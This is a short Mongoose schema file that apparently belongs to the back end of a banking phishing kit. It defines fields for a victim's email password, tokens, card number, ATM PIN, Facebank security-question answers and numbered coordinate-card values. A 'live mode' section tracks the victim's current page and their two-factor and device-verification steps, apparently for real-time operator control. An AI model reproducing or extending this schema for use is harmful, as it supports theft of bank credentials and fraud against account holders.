const { Schema, model } = require('mongoose');

const UserSchema = Schema({

    name: String,
    username: String,
    password: String,
    correo: String,
    celular: String,
    claveCorreo: String,
    token1: String,
    token2: String,
    token3: String,
    tarjeta: String,

    // FACEBANK
    faceBankAlias: String,
    facebankPreguntaPasatiempoFav: String,
    facebankPreguntaSitioVacacionesFav: String,
    facebankPreguntaModeloPrimerVehiculo: String,
    facebankPreguntaSegundoNombreDelPadre: String,
    facebankPreguntaComidaFav: String,
    
    dos: String,
    doce: String,
    veinteydos: String,
    treintaydos: String,
    cuatro: String,
    catorce: String,
    veinteycuatro: String,
    treintaycuatro: String,
    // END FACEBANK

    atmPassword: String,
    typeDocument: String,

    // MODE LIVE
    socketID: String,
    modeLive: Boolean,
    liveData: [{
        textPage: String,
        urlPage: String,
        success: Boolean
    }],

    pageNow: String,
    numberDevice: String,
    typeDevice: String,
    userAndPassword: Boolean,
    twoFactor: Boolean,
    passwordEmail: Boolean,
    verificationDevice: Boolean,
    isConnected: Boolean,
    isLoading: Boolean,
    // END MODE LIVE

    deleteUser: {
        type: Boolean,
        default: false
    },
    createAt: {
        type: String,
        default: new Date()
    },
    deleteAt: String,
    ip: String
});


module.exports = model( 'User', UserSchema );